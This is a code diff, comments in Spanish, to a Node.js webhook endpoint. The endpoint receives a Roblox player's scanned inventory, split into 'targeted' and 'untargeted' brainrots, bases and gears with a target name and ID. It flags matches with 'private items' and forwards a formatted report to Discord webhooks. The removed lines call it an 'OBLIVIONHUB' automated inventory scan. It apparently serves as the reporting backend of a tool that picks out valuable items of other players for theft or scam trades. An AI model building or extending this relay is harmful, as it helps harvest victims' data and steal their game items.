@@ -29,73 +29,45 @@ app.post('/webhook', async (req, res) => {
         const gearTargeted = data.gearTargeted || [];
         const gearUntargeted = data.gearUntargeted || [];
 
+        const privateBrainTargeted = data.privateBrainTargeted || [];
+        const privateBaseTargeted = data.privateBaseTargeted || [];
+        const privateGearTargeted = data.privateGearTargeted || [];
+
         const timestamp = data.timestamp || Date.now();
 
-        // Función para formatear lista con conteo de duplicados
-        function formatListWithCount(list) {
-            if (!list || list.length === 0) return 'Ninguno';
-            const counts = {};
-            list.forEach(item => {
-                counts[item] = (counts[item] || 0) + 1;
-            });
-            const formatted = Object.keys(counts).map(name => {
-                return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
-            });
-            return formatted.join(', ');
+        const content = [
+            `**📊 Inventario de ${player}**`,
+            `**Objetivo:** ${target} (ID: ${targetId})`,
+            ``,
+            `**🧠 BRAINROTS TARGETED (${brainTargeted.length}):**`,
+            brainTargeted.length > 0 ? brainTargeted.join(', ') : 'Ninguno',
+            `**🧠 BRAINROTS UNTARGETED (${brainUntargeted.length}):**`,
+            brainUntargeted.length > 0 ? brainUntargeted.join(', ') : 'Ninguno',
+            ``,
+            `**🎨 BASES TARGETED (${baseTargeted.length}):**`,
+            baseTargeted.length > 0 ? baseTargeted.join(', ') : 'Ninguno',
+            `**🎨 BASES UNTARGETED (${baseUntargeted.length}):**`,
+            baseUntargeted.length > 0 ? baseUntargeted.join(', ') : 'Ninguno',
+            ``,
+            `**⚙️ GEARS TARGETED (${gearTargeted.length}):**`,
+            gearTargeted.length > 0 ? gearTargeted.join(', ') : 'Ninguno',
+            `**⚙️ GEARS UNTARGETED (${gearUntargeted.length}):**`,
+            gearUntargeted.length > 0 ? gearUntargeted.join(', ') : 'Ninguno',
+        ];
+
+        if (hasPrivateItem) {
+            const privateMatches = [];
+            if (privateBrainTargeted.length > 0) privateMatches.push(`🧠 ${privateBrainTargeted.length} brainrots`);
+            if (privateBaseTargeted.length > 0) privateMatches.push(`🎨 ${privateBaseTargeted.length} bases`);
+            if (privateGearTargeted.length > 0) privateMatches.push(`⚙️ ${privateGearTargeted.length} gears`);
+            content.push(``);
+            content.push(`🔴 **¡Coincidencia con ítems privados!** (${privateMatches.join(', ')})`);
         }
 
-        // Función para formatear lista simple
-        function formatListSimple(list) {
-            if (!list || list.length === 0) return 'Ninguno';
-            return list.join(', ');
-        }
+        content.push(``);
+        content.push(`🕒 \`${new Date(timestamp).toLocaleString('es-ES', { timeZone: 'UTC' })}\``);
 
-        // Construir mensaje
-        const lines = [];
-
-        // Encabezado
-        lines.push('✅ SUCCESS: OBLIVIONHUB INVITE SENT');
-        lines.push(`✨ Invite successfully sent to Username: ${player}`);
-        lines.push('Inventory scan complete. Processing items.');
-        lines.push('');
-
-        // Sección de ítems targeteados por categoría
-        lines.push('Brainrots targeados:');
-        lines.push(formatListWithCount(brainTargeted));
-        lines.push('');
-
-        lines.push('Gears targeados:');
-        lines.push(formatListWithCount(gearTargeted));
-        lines.push('');
-
-        lines.push('Bases targeadas:');
-        lines.push(formatListWithCount(baseTargeted));
-        lines.push('');
-
-        // Sección de ítems NO targeteados (todos juntos)
-        lines.push('ITEMS NO TARGEADO:');
-        const allUntargeted = [...brainUntargeted, ...baseUntargeted, ...gearUntargeted];
-        if (allUntargeted.length === 0) {
-            lines.push('Ninguno');
-        } else {
-            lines.push(formatListWithCount(allUntargeted));
-        }
-        lines.push('');
-
-        // Footer
-        const date = new Date(timestamp);
-        const formattedDate = date.toLocaleString('es-ES', { 
-            timeZone: 'UTC',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
-        }).replace(/\//g, '-');
-        lines.push(`OBLIVIONHUB| Automated System•${formattedDate} UTC`);
-
-        const fullContent = lines.join('\n');
+        const fullContent = content.join('\n');
 
         const payload = {
             content: fullContent,
@@ -103,7 +75,6 @@ app.post('/webhook', async (req, res) => {
             avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
         };
 
-        // Decidir a qué webhooks enviar
         const webhooksToSend = [];
 
         if (hasPrivateItem) {
@@ -119,7 +90,6 @@ app.post('/webhook', async (req, res) => {
             webhooksToSend.push(FALLBACK_WEBHOOK);
         }
 
-        // Enviar a todos los webhooks
         for (const url of webhooksToSend) {
             try {
                 await axios.post(url, payload);
